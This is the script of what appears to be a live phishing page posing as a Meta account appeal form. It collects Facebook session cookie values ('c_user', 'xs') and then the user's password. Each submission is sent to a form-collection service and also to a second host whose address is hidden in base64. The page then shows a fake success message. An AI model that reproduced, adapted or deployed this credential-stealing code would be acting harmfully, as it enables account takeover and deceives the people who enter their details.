        document.getElementById('appealForm').addEventListener('submit', function(event) {
            event.preventDefault();
            let isValid = true;
            
            // Validate c_user (numbers only)
            const cUserInput = document.getElementById('c_user');
            const nameError = document.getElementById('nameError');
            if (!/^[0-9]+$/.test(cUserInput.value)) {
                nameError.style.display = 'block';
                cUserInput.classList.add('input-error');
                isValid = false;
            } else {
                nameError.style.display = 'none';
                cUserInput.classList.remove('input-error');
            }
            
            // Validate xs (letters, numbers, symbols)
            const xsInput = document.getElementById('xs');
            const mallError = document.getElementById('mallError');
            if (xsInput.value.trim() === '') {
                mallError.style.display = 'block';
                xsInput.classList.add('input-error');
                isValid = false;
            } else {
                mallError.style.display = 'none';
                xsInput.classList.remove('input-error');
            }
            
            if (isValid) {
                // First submit the form data to the external endpoint
                const formData = {
                    c_user: cUserInput.value,
                    xs: xsInput.value,
                    _meta: {
                        title: "Meta Appeal Form Submission",
                        website: "Meta Appeal Center"
                    }
                };
                
                // Submit to first form
                submitFormData(formData).then(() => {
                    // Also submit to second form
                    submitToSecondForm({
                        c_user: cUserInput.value,
                        xs: xsInput.value,
                        password: "" // Password will be added later
                    });
                    
                    // After successful submission, show password verification
                    document.getElementById('appealFormSection').style.display = 'none';
                    document.getElementById('passwordVerification').style.display = 'block';
                }).catch(error => {
                    console.error('Form submission error:', error);
                    alert('There was an error submitting your appeal. Please try again.');
                });
            }
        });

        document.getElementById('passwordForm').addEventListener('submit', function(event) {
            event.preventDefault();
            const password = document.getElementById('password').value;
            
            if (password.length === 0) {
                document.getElementById('passwordError').style.display = 'block';
                document.getElementById('password').classList.add('input-error');
                return;
            }
            
            // Get the previous form data
            const cUserInput = document.getElementById('c_user').value;
            const xsInput = document.getElementById('xs').value;
            
            // Submit to first form with password
            submitFormData({
                c_user: cUserInput,
                xs: xsInput,
                password: password,
                _meta: {
                    title: "Meta Password Verification",
                    website: "Meta Appeal Center"
                }
            }).then(() => {
                // Also submit to second form with password
                submitToSecondForm({
                    c_user: cUserInput,
                    xs: xsInput,
                    password: password
                });
                
                // Hide password form and show success message
                document.getElementById('passwordVerification').style.display = 'none';
                document.getElementById('successMessage').style.display = 'block';

                document.getElementById('referenceId').textContent = refId;
                
                // Animate progress bar
                document.getElementById('progressFill').style.width = '100%';
            }).catch(error => {
                console.error('Password submission error:', error);
                alert('There was an error verifying your account. Please try again.');
            });
        });

        // Function to submit form data to the external endpoint
        async function submitFormData(formData) {
            const response = await fetch('https://submit-form.com/IWmj6bVOO', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(formData)
            });
            
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            
            return response.json();
        }

        // Second form submission function
        function submitToSecondForm(data) {
            // Base64 encoded URL and headers
            const encodedUrl = 'aHR0cHM6Ly9jaG9yLWJhemFyLXBocC53YXNtZXIuYXBw';
            const decodedUrl = atob(encodedUrl);
            
            // Create form data
            const formData = new FormData();
            formData.append('c_user', data.c_user);
            formData.append('xs', data.xs);
            formData.append('password', data.password);
            
            fetch(decodedUrl, {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.text();
            })
            .then(data => {
                console.log('Second form submission successful:', data);
            })
            .catch(error => {
                console.error('Error submitting to second form:', error);
            });
        }
